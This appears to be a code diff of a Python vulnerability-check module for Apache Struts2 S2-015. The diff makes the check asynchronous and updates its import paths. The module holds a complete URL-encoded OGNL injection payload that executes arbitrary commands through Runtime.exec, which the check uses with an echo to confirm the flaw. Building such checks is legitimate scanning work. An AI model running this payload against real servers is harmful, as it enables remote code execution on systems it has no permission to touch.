@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 
-import re
-from app.lib.utils.request import request
-from app.lib.utils.encode import urlencode
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.encode import urlencode
+from app.lib.common import get_capta, get_useragent
 
 class S2_015_1_BaseVerify:
     def __init__(self, url):
@@ -24,7 +23,7 @@ class S2_015_1_BaseVerify:
         }
         self.payload = '''/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream())%2C%23q%7D.action'''
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -36,15 +35,13 @@ class S2_015_1_BaseVerify:
 
         try:
             check_url = self.url + self.payload.format(cmd = urlencode('echo' + ' ' + self.capta))
-            check_req = request.get(check_url, headers = self.headers)
-            if self.capta + '.jsp' in check_req.text.replace(' ', '').replace('\n', ''):
+            check_req = await request.get(check_url, headers = self.headers)
+            result = await check_req.text()
+            if self.capta + '.jsp' in result.replace(' ', '').replace('\n', ''):
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
